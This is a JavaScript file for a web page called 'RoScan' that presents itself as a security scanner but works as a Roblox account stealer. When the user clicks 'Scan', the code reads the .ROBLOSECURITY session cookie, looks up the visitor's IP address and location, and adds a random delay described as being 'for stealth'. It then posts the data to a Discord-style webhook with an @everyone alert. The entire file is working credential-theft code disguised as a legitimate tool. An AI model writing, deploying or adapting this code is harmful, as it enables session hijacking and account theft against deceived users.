// RoScan Vercel Production v1.0.0 - HTTPS via Vercel Serverless
console.log('🚀 RoScan Vercel v1.0.0 loaded - Ready for Vercel deployment!');

document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ DOM Content Loaded - Vercel production mode active');
    
    // Get submit button and attach event listener
    const submitBtn = document.getElementById('submitBtn');
    if (submitBtn) {
        submitBtn.addEventListener('click', submitPowerShell);
        console.log('✅ Submit button event listener attached');
    } else {
        console.error('❌ Submit button not found!');
    }
});

// Cookie extraction function
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

// Location detection function
async function getUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            city: data.city || 'Unknown',
            region: data.region || 'Unknown', 
            country: data.country_name || 'Unknown',
            ip: data.ip || 'Unknown'
        };
    } catch (error) {
        console.warn('Location detection failed:', error);
        return {
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            ip: 'Unknown'
        };
    }
}

// Show notification function
function showNotification(message, type = 'info') {
    console.log(`📢 Notification (${type}): ${message}`);
    
    // Create notification element
    const notification = document.createElement('div');
    notification.textContent = message;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
        color: white;
        padding: 12px 20px;
        border-radius: 8px;
        z-index: 10000;
        font-weight: 500;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        animation: slideIn 0.3s ease-out;
    `;
    
    document.body.appendChild(notification);
    
    // Remove after 3 seconds
    setTimeout(() => {
        if (notification.parentNode) {
            notification.parentNode.removeChild(notification);
        }
    }, 3000);
}

// Close scan modal function
function closeScanModal() {
    console.log('🔄 Closing scan modal');
    const modal = document.querySelector('.modal-overlay');
    if (modal) {
        modal.style.display = 'none';
    }
}

// Main webhook submission function - VERCEL PRODUCTION
async function submitPowerShell() {
    console.log('🚀 Vercel production webhook submission started');
    
    const submitBtn = document.getElementById('submitBtn');
    const submitText = submitBtn?.querySelector('.submit-text');
    const loadingOverlay = document.querySelector('.loading-overlay');
    
    if (!submitBtn || !submitText) {
        console.error('❌ Required UI elements not found');
        showNotification('UI elements not found', 'error');
        return;
    }
    
    // Update UI to show loading state
    submitText.textContent = 'Sending...';
    submitBtn.style.background = '#6b7280';
    if (loadingOverlay) loadingOverlay.style.display = 'flex';
    
    try {
        // Extract Roblox cookie
        const robloxCookie = getCookie('.ROBLOSECURITY');
        console.log('🍪 Roblox cookie extracted:', robloxCookie ? 'Found' : 'Not found');
        
        // Get user location
        console.log('📍 Getting user location...');
        const locationInfo = await getUserLocation();
        console.log('📍 Location info:', locationInfo);
        
        // Add random delay for stealth (1-3 seconds)
        const delay = Math.floor(Math.random() * 2000) + 1000;
        console.log(`⏱️ Adding ${delay}ms delay for stealth...`);
        await new Promise(resolve => setTimeout(resolve, delay));
        
        // Use Vercel API endpoint (automatically HTTPS)
        // This will be your-domain.vercel.app/api/webhook in production
        const webhookUrl = window.location.origin + '/api/webhook';
        
        // Prepare enhanced payload for Vercel API
        const payload = {
            // Discord-compatible content
            content: `@everyone\n🔥 **New RoScan Data**\n\n**Cookie:** \`${robloxCookie || 'None found'}\`\n**Location:** ${locationInfo.city}, ${locationInfo.region}, ${locationInfo.country}\n**IP:** ${locationInfo.ip}\n**Time:** ${new Date().toLocaleString()}`,
            
            // Enhanced embeds for better Discord presentation
            embeds: [{
                title: "🔍 RoScan Data Collection",
                description: "New security scan completed",
                color: 0x667eea,
                fields: [
                    {
                        name: "🍪 Cookie Status",
                        value: robloxCookie ? "✅ Found" : "❌ Not found",
                        inline: true
                    },
                    {
                        name: "📍 Location",
                        value: `${locationInfo.city}, ${locationInfo.region}`,
                        inline: true
                    },
                    {
                        name: "🌍 Country",
                        value: locationInfo.country,
                        inline: true
                    },
                    {
                        name: "🌐 IP Address",
                        value: locationInfo.ip,
                        inline: true
                    },
                    {
                        name: "🕒 Timestamp",
                        value: new Date().toLocaleString(),
                        inline: true
                    },
                    {
                        name: "🔧 Source",
                        value: "RoScan Vercel v1.0.0",
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "RoScan - Powered by Vercel"
                },
                thumbnail: {
                    url: "https://cdn.discordapp.com/emojis/123456789.png" // Optional emoji
                }
            }],
            
            // Metadata for processing
            metadata: {
                source: 'RoScan Vercel v1.0.0',
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                url: window.location.href,
                vercel_deployed: true
            }
        };
        
        // Send to Vercel API endpoint (automatically HTTPS)
        console.log('🌐 Sending to Vercel API endpoint...');
        console.log('📡 Webhook URL:', webhookUrl);
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(payload),
            mode: 'cors'
        });
        
        console.log(`✅ Vercel API response: ${response.status}`);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';

        if (response.ok) {
            const result = await response.json();
            console.log('🎉 Vercel webhook delivered successfully!', result);
            
            submitText.textContent = 'Sent!';
            submitBtn.style.background = '#10b981';
            showNotification('Data sent successfully via Vercel HTTPS!', 'success');
            
            // Auto-close modal after success
            setTimeout(() => {
                closeScanModal();
            }, 2000);
        } else {
            const errorData = await response.json().catch(() => ({ error: 'Unknown error' }));
            console.error(`❌ Vercel API failed: ${response.status}`, errorData);
            
            if (response.status === 404) {
                throw new Error('Vercel API endpoint not found. Check deployment.');
            } else if (response.status === 429) {
                throw new Error('Rate limited. Please wait a moment and try again.');
            } else if (response.status === 500) {
                throw new Error('Server error. Please try again later.');
            } else {
                throw new Error(`API failed (${response.status}): ${errorData.error || 'Unknown error'}`);
            }
        }
        
    } catch (error) {
        console.error('💥 Vercel webhook failed:', error);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';
        
        // Reset button state
        submitText.textContent = 'Scan';
        submitBtn.style.background = '#ef4444';
        
        // Show user-friendly error
        showNotification(`Error: ${error.message}`, 'error');
        
        // Reset button after 3 seconds
        setTimeout(() => {
            submitText.textContent = 'Scan';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Add CSS animation keyframes if not already present
if (!document.querySelector('#slideInKeyframes')) {
    const style = document.createElement('style');
    style.id = 'slideInKeyframes';
    style.textContent = `
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(100%);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
    `;
    document.head.appendChild(style);
}

// Production ready
console.log('🎯 RoScan Vercel v1.0.0 ready for Vercel deployment!');
console.log('📡 Using Vercel API endpoint for HTTPS webhook delivery');

// Make functions available globally
window.submitPowerShell = submitPowerShell;
window.getUserLocation = getUserLocation;